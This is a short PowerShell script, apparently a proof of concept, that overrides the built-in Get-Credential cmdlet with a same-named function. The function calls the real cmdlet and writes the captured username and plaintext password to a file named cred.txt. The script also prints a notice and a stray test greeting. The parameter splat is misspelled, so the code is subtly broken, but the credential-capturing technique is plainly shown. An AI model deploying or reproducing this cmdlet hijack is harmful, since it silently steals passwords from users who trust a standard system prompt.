$Function= Get-Command Get-Credential
write-host $Function

function Get-Credential {
    param(
        $Credential,
        $Message,
        $UserName
    )
    Write-Host "Hellof rom the other"
    $Output = & $Function @PSBoundParameter
    "$($Output.Username):$($Output.GetNetworkCredential().Password)" | Out-File cred.txt
    Write-Host -ForegroundColor "Red" -Object "Credential output to cred.txt"
    $Output
}